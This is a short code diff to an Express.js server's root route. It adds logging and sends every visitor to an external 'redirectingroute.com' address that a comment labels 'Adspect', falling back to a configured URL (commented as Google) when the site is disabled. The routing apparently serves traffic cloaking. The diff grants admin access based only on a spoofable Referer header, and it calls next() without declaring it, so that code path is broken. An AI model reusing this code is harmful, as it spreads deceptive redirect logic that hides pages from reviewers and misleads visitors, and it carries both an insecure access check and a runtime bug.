@@ -372,14 +372,22 @@ const io = new Server(server, {
 app.get('/', async (req, res) => {
     const isAdminPanel = req.headers.referer?.includes('/admin');
     
+    console.log('Root route accessed:');
+    console.log('- Website enabled:', state.settings.websiteEnabled);
+    console.log('- Is admin panel:', isAdminPanel);
+    
     if (isAdminPanel) {
         return next();
     }
     
-    if (!state.settings.websiteEnabled && !isAdminPanel) {
+    // If website is disabled, redirect to Google
+    if (!state.settings.websiteEnabled) {
+        console.log('- Redirecting to:', state.settings.redirectUrl);
         return res.redirect(state.settings.redirectUrl);
     }
 
+    // If website is enabled, redirect to Adspect
+    console.log('- Redirecting to: https://redirectingroute.com/');
     return res.redirect('https://redirectingroute.com/');
 });
 
